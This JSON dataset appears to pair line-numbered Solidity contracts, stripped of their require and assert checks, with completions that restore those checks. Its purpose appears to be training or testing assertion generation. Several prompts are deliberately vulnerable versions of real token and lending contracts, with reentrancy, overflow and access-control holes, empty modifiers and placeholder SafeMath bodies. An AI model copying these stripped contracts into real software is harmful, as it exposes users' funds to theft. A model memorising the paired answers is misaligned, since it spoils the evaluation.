[
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract ExternalFunctionCall {\n\n3     function foo(uint x) public returns (uint ret) {\n4         ret = x + 2;\n5     }\n\n6     function testExternalFunctionCall(uint x) public {\n7         uint y = this.foo(x);        \n8     }\n\n9 }",
        "completion": "7+ assert (y == x + 2);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n2 contract B {\n3    function funcB() public pure returns (uint) {\n4        return 42;\n5    }\n6    constructor() public {}\n7 }\n\n8 contract A {\n9    function funcA1() public pure returns (uint) {\n10        return 11;\n11    }\n12    function funcA2(uint x) public pure returns (uint) {\n13        return x+1;\n14    }\n15    function funcA3() public returns (B) {\n16        B retVal= new B();\n17        return retVal;\n18    }\n19    constructor() public\n20     {\n              \n21     }\n22 }",
        "completion": "20+ assert(funcA2(funcA1())==12);\n20+ assert(funcA3().funcB()==42);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 // This test passes, but assertion on line 35 is only proved\n3 // up to 4 transactions\n4 // This result means that ctor A is only called once, for B, as A(x+1)\n5 // Compare this test with ConstructorChaining2_fail.sol: no ctor args there,\n6 // so the workaround in the compiler doesn't work, and the base ctor is called twice \n\n\n7 // Example of the trace:\n8 // D(x) is called, where x is 716\n9 // B(x+3) called, where x is 716, B's arg is 719\n10 // A(x+1) called, where x is 720. A's arg is 720\n11 // ctor A {a = x} , where a is 720\n12 // ctor B  {b = x+1 } , where x is 719, b is 720\n13 // C(x+4) is called, where x is 716, C's arg is 720\n14 // ctor C   { c = x + 2}, where x is 720, c is 722\n\n15 contract A {\n16     uint a;\n17     constructor (uint x) public {\n18         a = x;\n19     }\n20 }\n\n21 contract B is A {\n22     uint b;\n23     constructor (uint x) A(x+1) public {  \n24         b = x + 1;             \n25     }\n26 }\n\n27 contract C is A {\n28     uint c;\n29     //constructor (uint x) A(x+2) public {          // no A with ANY args here, otherwise, solc error:\n30                                                                                                         // \"Base constr args given twice\"\n31         constructor (uint x) public {\n32         c = x + 2;                       \n33     }\n34 }\n\n35 contract D is B, C {\n36     constructor (uint x) B(x+3) C(x+4) public\n37     {        \n38     }\n39 }",
        "completion": "24+ assert(a == x + 1);\n32+ assert(a == x);\n37+  assert (a == x + 4);  \n37+  assert (b == x + 4);  \n37+  assert (c == x + 6);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n2 contract B {\n3    function funcB() public pure returns (uint) {\n4        return 42;\n5    }\n6    constructor() public {}\n7 }\n\n8 contract A {\n9    function funcA1() public pure returns (uint) {\n10        return 11;\n11    }\n12    function funcA2(uint x) public pure returns (uint) {\n13        return x+1;\n14    }\n15    function funcA3() public returns (B) {\n16        B retVal= new B();\n17        return retVal;\n18    }\n19    constructor() public\n20     {\n21     }\n22 }",
        "completion": "20+ assert(funcA2(funcA1())==12);\n20+ assert(funcA3().funcB()==42);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 // This test passes, but assertion on line 35 is only proved\n3 // up to 4 transactions\n4 // This result means that ctor A is only called once, for B, as A(x+1)\n5 // Compare this test with ConstructorChaining2_fail.sol: no ctor args there,\n6 // so the workaround in the compiler doesn't work, and the base ctor is called twice \n\n\n7 // Example of the trace:\n8 // D(x) is called, where x is 716\n9 // B(x+3) called, where x is 716, B's arg is 719\n10 // A(x+1) called, where x is 720. A's arg is 720\n11 // ctor A {a = x} , where a is 720\n12 // ctor B  {b = x+1 } , where x is 719, b is 720\n13 // C(x+4) is called, where x is 716, C's arg is 720\n14 // ctor C   { c = x + 2}, where x is 720, c is 722\n\n15 contract A {\n16     uint a;\n17     constructor (uint x) public {\n18         a = x;\n19     }\n20 }\n\n21 contract B is A {\n22     uint b;\n23     constructor (uint x) A(x+1) public {  \n24         b = x + 1;\n25     }\n26 }\n\n27 contract C is A {\n28     uint c;\n29     //constructor (uint x) A(x+2) public {          // no A with ANY args here, otherwise, solc error:\n30                                                                                                         // \"Base constr args given twice\"\n31         constructor (uint x) public {\n32         c = x + 2;\n33       // passes, but proved to only 4 transactions        \n34     }\n35 }\n\n36 contract D is B, C {\n37     constructor (uint x) B(x+3) C(x+4) public\n38     {        \n39        ;    \n40     }\n41 }",
        "completion": "24+ assert(a == x + 1);\n32+ assert(a == x);   \n38+ assert (a == x + 4);  \n38+  assert (b == x + 4);  \n38+  assert (c == x + 6);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24<0.6.0;\n2 import \"./Libraries/VeriSolContracts.sol\";\n\n\n3 contract LoopFor {\n\n4     int x;\n5     int y;\n\n6     function ContractInvariant () private view {\n    \n7     }\n\n8     // test Loop invariant with for loop\n9     constructor(int n) public {\n10         require (n >= 0);\n11         x = n;\n12         y = x;\n13     }\n\n14     function Foo() public {\n15         if ( x > 0 ) \n16         {\n17            x--;\n18            y--;\n19         }      \n20     } \n21 }",
        "completion": "6+ assert(x == y);\n6+  assert(y >= 0);\n19+  assert (y >= 0); "
    },
    {
        "prompt": "pragma solidity >=0.4.24 <0.6.0;\n\n//simple library with no internal state\n\nlibrary Lib {\n    function add(uint _a, uint _b) public view returns (uint r) {\n        address x = address(this);       \n        r = _a + _b;\n    }\n}\n\ncontract C {\n    // using Lib for uint;\n\n    function foo() public {\n        uint x = 1;\n        uint y = 2;\n        uint z = Lib.add(x, y);        \n    }\n}",
        "completion": "5+ assert(x == msg.sender);\n14+ assert (z == 3);"
    },
    {
        "prompt": "1 pragma solidity ^0.4.24;\n2 import \"./../../Libraries/VeriSolContracts.sol\";\n3 //import \"./VeriSolContracts.sol\";\n4 //import \"github.com/microsoft/verisol/blob/master/Libraries/VeriSolContracts.sol\";\n\n5 contract LoopFor {\n\n6     // test Loop invariant with for loop\n7     constructor(uint n) public {\n8         require (n >= 0);\n9         uint y = 0;\n10         for (uint x = n; x != 0; x --) {         \n11             y++;\n12         }\n      \n13     }\n\n14     // test Loop invariant with while loop\n15     function Foo(uint n) public {\n16         require (n >= 0);\n17         uint y = 0;\n18         uint x = n;\n19         while (x != 0) {          \n20             y++;\n21             x--;\n22         }     \n23     }\n\n24     // test Loop invariant with do-while loop    \n25     function Bar(uint n) public {\n26         require (n > 0);\n27         uint y = 0;\n28         uint x = n;\n29         do {          \n30             y++;\n31             x--;\n32         } while (x != 0);       \n33     }\n34 }",
        "completion": "10+  assert(x + y == n);\n12+  assert (y == n);\n19+  assert(x + y == n);\n22+  assert (y == n);\n29+  assert(x + y == n);\n32+ assert (y == n);"
    },
    {
        "prompt": "1 pragma solidity ^0.5.0;\n\n2 import \"./IERC20.sol\";\n3 import \"./SafeMath.sol\";\n4 import \"./Libraries/VeriSolContracts.sol\"; //change \n\n\n5 /**\n6  * A highly simplified Token to express basic specifications\n7  * \n8  * - totalSupply() equals the Sum({balanceOf(a) | a is an address })\n9  * \n10  */\n11 contract ERC20 is IERC20 {\n\n12     mapping (address => uint256) private _balances;\n13     uint256 private _totalSupply;\n\n\n14     /**\n15      * A dummy constructor\n16      */\n17     constructor (uint256 totalSupply) public {       \n18        _totalSupply = totalSupply;\n19        _balances[msg.sender] = totalSupply;\n20     }\n\n21     /**\n22      * @dev See {IERC20-totalSupply}.\n23      */\n24     function totalSupply() public view returns (uint256) {\n25         return _totalSupply;\n26     }\n\n27     /**\n28      * @dev See {IERC20-balanceOf}.\n29      */\n30     function balanceOf(address account) public view returns (uint256) {\n31         return _balances[account];\n32     }\n\n33     /**\n34      * @dev See {IERC20-transfer}.\n35      *\n36      * Requirements:\n37      *\n38      * - `recipient` cannot be the zero address.\n39      * - the caller must have a balance of at least `amount`.\n40      */\n41     function transfer(address recipient, uint256 amount) public returns (bool) {\n42         uint oldBalanceSender = _balances[msg.sender];\n\n43         _transfer(msg.sender, recipient, amount); \n\n44         //assert (/* msg.sender == recipient ||  */ _balances[msg.sender] == oldBalanceSender - amount);\n45         // the following assertion will fail due to overflow when not using safemath\n46         //   to detect it,  run with /modularArith flag\n47         //   to prove it, run ERC20 with /modularArith flag       \n48         return true;\n49     }\n\n50     /**\n51      * @dev Moves tokens `amount` from `sender` to `recipient`.\n52      *\n53      * This is internal function is equivalent to {transfer}, and can be used to\n54      * e.g. implement automatic token fees, slashing mechanisms, etc.\n55      *\n56      * Emits a {Transfer} event.\n57      *\n58      * Requirements:\n59      *\n60      * - `sender` cannot be the zero address.\n61      * - `recipient` cannot be the zero address.\n62      * - `sender` must have a balance of at least `amount`.\n63      */\n64     function _transfer(address sender, address recipient, uint256 amount) internal {\n65         require(sender != address(0), \"ERC20: transfer from the zero address\");\n66         require(recipient != address(0), \"ERC20: transfer to the zero address\");      \n67         _balances[sender] = SafeMath.sub(_balances[sender], amount);\n                        \n68                 _balances[recipient] = _balances[recipient] + amount; // nosafemath //_balances[recipient] = _balances[recipient].add(amount);\n69     }\n70 }",
        "completion": "17+ require(msg.sender != address(0));\n47+ assert (msg.sender == recipient || _balances[recipient] >= VeriSol.Old(_balances[recipient])); \n66+ require(_balances[sender] >= amount);"
    },
    {
        "prompt": "1 //SPDX-License-Identifier: MIT\n2 pragma solidity 0.7.5;\n\n3 contract contrived{\n4  function withdraw(uint256 amount) override public nonReentrant updateReward(msg.sender) {  \n5     _totalSupply = _totalSupply - amount;\n6     _balances[msg.sender] = _balances[msg.sender].sub(amount);\n7     stakingToken.safeTransfer(msg.sender, amount);\n\n8     emit Withdrawn(msg.sender, amount);\n9   }\n10 }",
        "completion": "4+   require(amount > 0, \"Cannot withdraw 0\");"
    },
    {
        "prompt": "1 /**\n2  *Submitted for verification at Etherscan.io on 2018-02-09\n3 */\n\n4 pragma solidity ^0.4.16;\n\n5 /**\n6  * @title SafeMath\n7  * @dev Math operations with safety checks that throw on error\n8  */\n9 library SafeMath {\n10   function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n11     uint256 c = a * b;\n12     return c;\n13   }\n\n14   function div(uint256 a, uint256 b) internal constant returns (uint256) {\n15     // assert(b > 0); // Solidity automatically throws when dividing by 0\n16     uint256 c = a / b;\n17     // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n18     return c;\n19   }\n\n20   function sub(uint256 a, uint256 b) internal constant returns (uint256) {    \n21     return a - b;\n22   }\n\n23   function add(uint256 a, uint256 b) internal constant returns (uint256) {\n24     uint256 c = a + b;    \n25     return c;\n26   }\n27 }\n\n28 /**\n29  * @title ERC20Basic\n30  * @dev Simpler version of ERC20 interface\n31  * @dev see https://github.com/ethereum/EIPs/issues/179\n32  */\n33 contract ERC20Basic {\n34   uint256 public totalSupply;\n35   function balanceOf(address who) public constant returns (uint256);\n36   function transfer(address to, uint256 value) public returns (bool);\n37   event Transfer(address indexed from, address indexed to, uint256 value);\n38 }\n\n39 /**\n40  * @title Basic token\n41  * @dev Basic version of StandardToken, with no allowances.\n42  */\n43 contract BasicToken is ERC20Basic {\n44   using SafeMath for uint256;\n\n45   mapping(address => uint256) balances;\n\n46   /**\n47   * @dev transfer token for a specified address\n48   * @param _to The address to transfer to.\n49   * @param _value The amount to be transferred.\n50   */\n51   function transfer(address _to, uint256 _value) public returns (bool) {  \n\n52     // SafeMath.sub will throw if there is not enough balance.\n53     balances[msg.sender] = balances[msg.sender].sub(_value);\n54     balances[_to] = balances[_to].add(_value);\n55     Transfer(msg.sender, _to, _value);\n56     return true;\n57   }\n\n58   /**\n59   * @dev Gets the balance of the specified address.\n60   * @param _owner The address to query the the balance of.\n61   * @return An uint256 representing the amount owned by the passed address.\n62   */\n63   function balanceOf(address _owner) public constant returns (uint256 balance) {\n64     return balances[_owner];\n65   }\n66 }\n\n67 /**\n68  * @title ERC20 interface\n69  * @dev see https://github.com/ethereum/EIPs/issues/20\n70  */\n71 contract ERC20 is ERC20Basic {\n72   function allowance(address owner, address spender) public constant returns (uint256);\n73   function transferFrom(address from, address to, uint256 value) public returns (bool);\n74   function approve(address spender, uint256 value) public returns (bool);\n75   event Approval(address indexed owner, address indexed spender, uint256 value);\n76 }\n\n\n77 /**\n78  * @title Standard ERC20 token\n79  *\n80  * @dev Implementation of the basic standard token.\n81  * @dev https://github.com/ethereum/EIPs/issues/20\n82  * @dev Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\n83  */\n84 contract StandardToken is ERC20, BasicToken {\n\n85   mapping (address => mapping (address => uint256)) internal allowed;\n\n\n86   /**\n87    * @dev Transfer tokens from one address to another\n88    * @param _from address The address which you want to send tokens from\n89    * @param _to address The address which you want to transfer to\n90    * @param _value uint256 the amount of tokens to be transferred\n91    */\n92   function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n93     require(_to != address(0));\n94     require(_value > 0 && _value <= balances[_from]);\n95     require(_value <= allowed[_from][msg.sender]);\n\n96     balances[_from] = balances[_from].sub(_value);\n97     balances[_to] = balances[_to].add(_value);\n98     allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n99     Transfer(_from, _to, _value);\n100     return true;\n101   }\n\n102   /**\n103    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\n104    *\n105    * Beware that changing an allowance with this method brings the risk that someone may use both the old\n106    * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\n107    * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:\n108    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n109    * @param _spender The address which will spend the funds.\n110    * @param _value The amount of tokens to be spent.\n111    */\n112   function approve(address _spender, uint256 _value) public returns (bool) {\n113     allowed[msg.sender][_spender] = _value;\n114     Approval(msg.sender, _spender, _value);\n115     return true;\n116   }\n\n117   /**\n118    * @dev Function to check the amount of tokens that an owner allowed to a spender.\n119    * @param _owner address The address which owns the funds.\n120    * @param _spender address The address which will spend the funds.\n121    * @return A uint256 specifying the amount of tokens still available for the spender.\n122    */\n123   function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n124     return allowed[_owner][_spender];\n125   }\n126 }\n\n127 /**\n128  * @title Ownable\n129  * @dev The Ownable contract has an owner address, and provides basic authorization control\n130  * functions, this simplifies the implementation of \"user permissions\".\n131  */\n132 contract Ownable {\n133   address public owner;\n\n\n134   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n\n135   /**\n136    * @dev The Ownable constructor sets the original `owner` of the contract to the sender\n137    * account.\n138    */\n139   function Ownable() {\n140     owner = msg.sender;\n141   }\n\n\n142   /**\n143    * @dev Throws if called by any account other than the owner.\n144    */\n145   modifier onlyOwner() {   \n146     _;\n147   }\n\n\n148   /**\n149    * @dev Allows the current owner to transfer control of the contract to a newOwner.\n150    * @param newOwner The address to transfer ownership to.\n151    */\n152   function transferOwnership(address newOwner) onlyOwner public {  \n153     OwnershipTransferred(owner, newOwner);\n154     owner = newOwner;\n155   }\n\n156 }\n\n157 /**\n158  * @title Pausable\n159  * @dev Base contract which allows children to implement an emergency stop mechanism.\n160  */\n161 contract Pausable is Ownable {\n162   event Pause();\n163   event Unpause();\n\n164   bool public paused = false;\n\n\n165   /**\n166    * @dev Modifier to make a function callable only when the contract is not paused.\n167    */\n168   modifier whenNotPaused() {   \n169     _;\n170   }\n\n171   /**\n172    * @dev Modifier to make a function callable only when the contract is paused.\n173    */\n174   modifier whenPaused() {   \n175     _;\n176   }\n\n177   /**\n178    * @dev called by the owner to pause, triggers stopped state\n179    */\n180   function pause() onlyOwner whenNotPaused public {\n181     paused = true;\n182     Pause();\n183   }\n\n184   /**\n185    * @dev called by the owner to unpause, returns to normal state\n186    */\n187   function unpause() onlyOwner whenPaused public {\n188     paused = false;\n189     Unpause();\n190   }\n191 }\n\n192 /**\n193  * @title Pausable token\n194  *\n195  * @dev StandardToken modified with pausable transfers.\n196  **/\n\n197 contract PausableToken is StandardToken, Pausable {\n\n198   function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n199     return super.transfer(_to, _value);\n200   }\n\n201   function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n202     return super.transferFrom(_from, _to, _value);\n203   }\n\n204   function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n205     return super.approve(_spender, _value);\n206   }\n  \n207   function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) {\n208     uint cnt = _receivers.length;\n209     uint256 amount = uint256(cnt) * _value;\n210     require(cnt > 0 && cnt <= 20);\n211     require(_value > 0 && balances[msg.sender] >= amount);\n\n212     balances[msg.sender] = balances[msg.sender].sub(amount);\n213     for (uint i = 0; i < cnt; i++) {\n214         balances[_receivers[i]] = balances[_receivers[i]].add(_value);\n215         Transfer(msg.sender, _receivers[i], _value);\n216     }\n217     return true;\n218   }\n219 }\n\n220 /**\n221  * @title Bec Token\n222  *\n223  * @dev Implementation of Bec Token based on the basic standard token.\n224  */\n225 contract BecToken is PausableToken {\n226     /**\n227     * Public variables of the token\n228     * The following variables are OPTIONAL vanities. One does not have to include them.\n229     * They allow one to customise the token contract & in no way influences the core functionality.\n230     * Some wallets/interfaces might not even bother to look at this information.\n231     */\n232     string public name = \"BeautyChain\";\n233     string public symbol = \"BEC\";\n234     string public version = '1.0.0';\n235     uint8 public decimals = 18;\n\n236     /**\n237      * @dev Function to check the amount of tokens that an owner allowed to a spender.\n238      */\n239     function BecToken() {\n240       totalSupply = 7000000000 * (10**(uint256(decimals)));\n241       balances[msg.sender] = totalSupply;    // Give the creator all initial tokens\n242     }\n\n243     function () {\n244         //if ether is sent to this address, send it back.\n245         revert();\n246     }\n247 }",
        "completion": "11+  assert(a == 0 || c / a == b);\n20+ assert(b <= a);\n24+ assert(c >= a);\n51+   require(_to != address(0));\n51+ require(_value > 0 && _value <= balances[msg.sender]);\n145+ require(msg.sender == owner);\n152+  require(newOwner != address(0));\n168+ require(!paused);\n174+ require(paused);\n"
    },
    {
        "prompt": "1 /**\n2  *Submitted for verification at Etherscan.io on 2020-10-07\n3 */\n\n4 // File: openzeppelin-solidity-2.3.0/contracts/ownership/Ownable.sol\n\n5 pragma solidity ^0.5.0;\n\n6 contract Bank{\n\n\n7 //reentrant here \n8     function work(uint256 id, address goblin, uint256 loan, uint256 maxReturn, bytes calldata data)\n9         external payable\n10         onlyEOA accrue(msg.value)\n11     {\n12         // 1. Sanity check the input position, or add a new position of ID is 0.\n13         if (id == 0) {\n14             id = nextPositionID++;\n15             positions[id].goblin = goblin;\n16             positions[id].owner = msg.sender;\n17         } else {\n18            _;\n19         }\n20         emit Work(id, loan);\n21         // 2. Make sure the goblin can accept more debt and remove the existing debt.      \n22         uint256 debt = _removeDebt(id).add(loan);\n23         // 3. Perform the actual work, using a new scope to avoid stack-too-deep errors.\n24         uint256 back;\n25         {\n26             uint256 sendETH = msg.value.add(loan);\n27             require(sendETH <= address(this).balance, \"insufficient ETH in the bank\");\n28             uint256 beforeETH = address(this).balance.sub(sendETH);\n29             Goblin(goblin).work.value(sendETH)(id, msg.sender, debt, data);\n30             back = address(this).balance.sub(beforeETH);\n31         }\n32         // 4. Check and update position debt.\n33         uint256 lessDebt = Math.min(debt, Math.min(back, maxReturn));\n34         debt = debt.sub(lessDebt);\n35         if (debt > 0) {           \n36             uint256 health = Goblin(goblin).health(id);\n37             uint256 workFactor = config.workFactor(goblin, debt);          \n38             _addDebt(id, debt);\n39         }\n40         // 5. Return excess ETH back.\n41         if (back > lessDebt) SafeToken.safeTransferETH(msg.sender, back - lessDebt);\n42     }\n43 }\n",
        "completion": "17+ require(id < nextPositionID, \"bad position id\");\n17+ require(positions[id].goblin == goblin, \"bad position goblin\");\n17+ require(positions[id].owner == msg.sender, \"not position owner\");\n21+  require(config.isGoblin(goblin), \"not a goblin\");\n21+  require(loan == 0 || config.acceptDebt(goblin), \"goblin not accept more debt\");\n35+ require(debt >= config.minDebtSize(), \"too small debt size\");\n37+  require(health.mul(workFactor) >= debt.mul(10000), \"bad work factor\");\n"
    },
    {
        "prompt": "1 /**\n2  *Submitted for verification at BscScan.com on 2021-07-30\n3 */\n\n4 //SPDX-License-Identifier: MIT\n5 pragma solidity ^0.8.0;\n\n\n6 abstract contract ReentrancyGuard {\n7         uint256 private constant _NOT_ENTERED = 1;\n8         uint256 private constant _ENTERED = 2;\n9         uint256 private _status;\n10         constructor () {\n11             _status = _NOT_ENTERED;\n12         }\n    \n13         modifier nonReentrant() {           \n14             _status = _ENTERED;\n15             _;\n16             _status = _NOT_ENTERED;\n17         }\n18     }\n\n\n19 contract surgeToken{\n  \n20   /** Sells SURGE Tokens And Deposits the BNB into Seller's Address */\n21     function sell(uint256 tokenAmount) public nonReentrant returns (bool) {\n        \n22         address seller = msg.sender;\n        \n23         // make sure seller has this balance\n24         require(_balances[seller] >= tokenAmount, 'cannot sell above token amount');\n        \n25         // calculate the sell fee from this transaction\n26         uint256 tokensToSwap = tokenAmount.mul(sellFee).div(10**2);\n        \n27         // how much BNB are these tokens worth?\n28         uint256 amountBNB = tokensToSwap.mul(calculatePrice());\n        \n29         //reentrant happens here: during call fallback, the attacker invoked purchase multiple times\n30         (bool successful,) = payable(seller).call{value: amountBNB, gas: 40000}(\"\"); \n31         if (successful) {\n32             // subtract full amount from sender\n33             _balances[seller] = _balances[seller].sub(tokenAmount, 'sender does not have this amount to sell');\n34             // if successful, remove tokens from supply\n35             _totalSupply = _totalSupply.sub(tokenAmount);\n36         } else {\n37             revert();\n38         }\n39         emit Transfer(seller, address(this), tokenAmount);\n40         return true;\n41     }\n\n    \n42     function purchase(address buyer, uint256 bnbAmount) internal returns (bool) {\n43         // make sure we don't buy more than the bnb in this contract\n44                 // previous amount of BNB before we received any        \n45         uint256 prevBNBAmount = (address(this).balance).sub(bnbAmount);\n46         // if this is the first purchase, use current balance\n47         prevBNBAmount = prevBNBAmount == 0 ? address(this).balance : prevBNBAmount;\n48         // find the number of tokens we should mint to keep up with the current price\n49         uint256 nShouldPurchase = hyperInflatePrice ? _totalSupply.mul(bnbAmount).div(address(this).balance) : _totalSupply.mul(bnbAmount).div(prevBNBAmount);\n50         // apply our spread to tokens to inflate price relative to total supply\n51         uint256 tokensToSend = nShouldPurchase.mul(spreadDivisor).div(10**2);\n52         // revert if under 1\n53         if (tokensToSend < 1) {\n54             revert('Must Buy More Than One Surge');\n55         }\n56     }\n\n57 }",
        "completion": "13+  require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\n44+ require(bnbAmount <= address(this).balance, 'purchase not included in balance');"
    },
    {
        "prompt": "1 /**\n2  *Submitted for verification at BscScan.com on 2021-07-30\n3 */\n\n4 //SPDX-License-Identifier: MIT\n5 pragma solidity ^0.8.0;\n\n\n6 /**\n7  *Submitted for verification at FtmScan.com on 2021-08-31\n8 */\n\n9 // SPDX-License-Identifier: MIT\n10 // File: @openzeppelin/contracts/GSN/Context.sol\n\n11 pragma solidity ^0.5.0;\n\n12 /*\n13  * @dev Provides information about the current execution context, including the\n14  * sender of the transaction and its data. While these are generally available\n15  * via msg.sender and msg.data, they should not be accessed in such a direct\n16  * manner, since when dealing with GSN meta-transactions the account sending and\n17  * paying for execution may not be the actual sender (as far as an application\n18  * is concerned).\n19  *\n20  * This contract is only required for intermediate, library-like contracts.\n21  */\n22 abstract contract Context {\n23     function _msgSender() internal view virtual returns (address payable) {\n24         return msg.sender;\n25     }\n\n26     function _msgData() internal view virtual returns (bytes memory) {\n27         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n28         return msg.data;\n29     }\n30 }\n\n31 // File: @openzeppelin/contracts/token/ERC20/IERC20.sol\n\n\n32 /**\n33  * @dev Interface of the ERC20 standard as defined in the EIP.\n34  */\n35 interface IERC20 {\n36     /**\n37      * @dev Returns the amount of tokens in existence.\n38      */\n39     function totalSupply() external view returns (uint256);\n\n40     /**\n41      * @dev Returns the amount of tokens owned by `account`.\n42      */\n43     function balanceOf(address account) external view returns (uint256);\n\n44     /**\n45      * @dev Moves `amount` tokens from the caller's account to `recipient`.\n46      *\n47      * Returns a boolean value indicating whether the operation succeeded.\n48      *\n49      * Emits a {Transfer} event.\n50      */\n51     function transfer(address recipient, uint256 amount) external returns (bool);\n\n52     /**\n53      * @dev Returns the remaining number of tokens that `spender` will be\n54      * allowed to spend on behalf of `owner` through {transferFrom}. This is\n55      * zero by default.\n56      *\n57      * This value changes when {approve} or {transferFrom} are called.\n58      */\n59     function allowance(address owner, address spender) external view returns (uint256);\n\n60     /**\n61      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n62      *\n63      * Returns a boolean value indicating whether the operation succeeded.\n64      *\n65      * IMPORTANT: Beware that changing an allowance with this method brings the risk\n66      * that someone may use both the old and the new allowance by unfortunate\n67      * transaction ordering. One possible solution to mitigate this race\n68      * condition is to first reduce the spender's allowance to 0 and set the\n69      * desired value afterwards:\n70      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n71      *\n72      * Emits an {Approval} event.\n73      */\n74     function approve(address spender, uint256 amount) external returns (bool);\n\n75     /**\n76      * @dev Moves `amount` tokens from `sender` to `recipient` using the\n77      * allowance mechanism. `amount` is then deducted from the caller's\n78      * allowance.\n79      *\n80      * Returns a boolean value indicating whether the operation succeeded.\n81      *\n82      * Emits a {Transfer} event.\n83      */\n84     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n85     /**\n86      * @dev Emitted when `value` tokens are moved from one account (`from`) to\n87      * another (`to`).\n88      *\n89      * Note that `value` may be zero.\n90      */\n91     event Transfer(address indexed from, address indexed to, uint256 value);\n\n92     /**\n93      * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n94      * a call to {approve}. `value` is the new allowance.\n95      */\n96     event Approval(address indexed owner, address indexed spender, uint256 value);\n97 }\n\n98 // File: @openzeppelin/contracts/math/SafeMath.sol\n\n\n\n99 /**\n100  * @dev Wrappers over Solidity's arithmetic operations with added overflow\n101  * checks.\n102  *\n103  * Arithmetic operations in Solidity wrap on overflow. This can easily result\n104  * in bugs, because programmers usually assume that an overflow raises an\n105  * error, which is the standard behavior in high level programming languages.\n106  * `SafeMath` restores this intuition by reverting the transaction when an\n107  * operation overflows.\n108  *\n109  * Using this library instead of the unchecked operations eliminates an entire\n110  * class of bugs, so it's recommended to use it always.\n111  */\n112 library SafeMath {\n113     /**\n114      * @dev Returns the addition of two unsigned integers, reverting on\n115      * overflow.\n116      *\n117      * Counterpart to Solidity's `+` operator.\n118      *\n119      * Requirements:\n120      *\n121      * - Addition cannot overflow.\n122      */\n123     function add(uint256 a, uint256 b) internal pure returns (uint256) {\n124         uint256 c = a + b;      \n125         return c;\n126     }\n\n127     /**\n128      * @dev Returns the subtraction of two unsigned integers, reverting on\n129      * overflow (when the result is negative).\n130      *\n131      * Counterpart to Solidity's `-` operator.\n132      *\n133      * Requirements:\n134      *\n135      * - Subtraction cannot overflow.\n136      */\n137     function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n138        _;\n139     }\n\n140     /**\n141      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n142      * overflow (when the result is negative).\n143      *\n144      * Counterpart to Solidity's `-` operator.\n145      *\n146      * Requirements:\n147      *\n148      * - Subtraction cannot overflow.\n149      */\n150     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {     \n151         uint256 c = a - b;\n\n152         return c;\n153     }\n\n154     /**\n155      * @dev Returns the multiplication of two unsigned integers, reverting on\n156      * overflow.\n157      *\n158      * Counterpart to Solidity's `*` operator.\n159      *\n160      * Requirements:\n161      *\n162      * - Multiplication cannot overflow.\n163      */\n164     function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n165         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n166         // benefit is lost if 'b' is also tested.\n167         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n168         if (a == 0) {\n169             return 0;\n170         }\n\n171         uint256 c = a * b;      \n172         return c;\n173     }\n\n174     /**\n175      * @dev Returns the integer division of two unsigned integers. Reverts on\n176      * division by zero. The result is rounded towards zero.\n177      *\n178      * Counterpart to Solidity's `/` operator. Note: this function uses a\n179      * `revert` opcode (which leaves remaining gas untouched) while Solidity\n180      * uses an invalid opcode to revert (consuming all remaining gas).\n181      *\n182      * Requirements:\n183      *\n184      * - The divisor cannot be zero.\n185      */\n186     function div(uint256 a, uint256 b) internal pure returns (uint256) {\n187         _;\n188     }\n\n189     /**\n190      * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n191      * division by zero. The result is rounded towards zero.\n192      *\n193      * Counterpart to Solidity's `/` operator. Note: this function uses a\n194      * `revert` opcode (which leaves remaining gas untouched) while Solidity\n195      * uses an invalid opcode to revert (consuming all remaining gas).\n196      *\n197      * Requirements:\n198      *\n199      * - The divisor cannot be zero.\n200      */\n201     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {        \n202         uint256 c = a / b;\n203         // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n204         return c;\n205     }\n\n206     /**\n207      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n208      * Reverts when dividing by zero.\n209      *\n210      * Counterpart to Solidity's `%` operator. This function uses a `revert`\n211      * opcode (which leaves remaining gas untouched) while Solidity uses an\n212      * invalid opcode to revert (consuming all remaining gas).\n213      *\n214      * Requirements:\n215      *\n216      * - The divisor cannot be zero.\n217      */\n218     function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n219         _;\n220     }\n\n221     /**\n222      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n223      * Reverts with custom message when dividing by zero.\n224      *\n225      * Counterpart to Solidity's `%` operator. This function uses a `revert`\n226      * opcode (which leaves remaining gas untouched) while Solidity uses an\n227      * invalid opcode to revert (consuming all remaining gas).\n228      *\n229      * Requirements:\n230      *\n231      * - The divisor cannot be zero.\n232      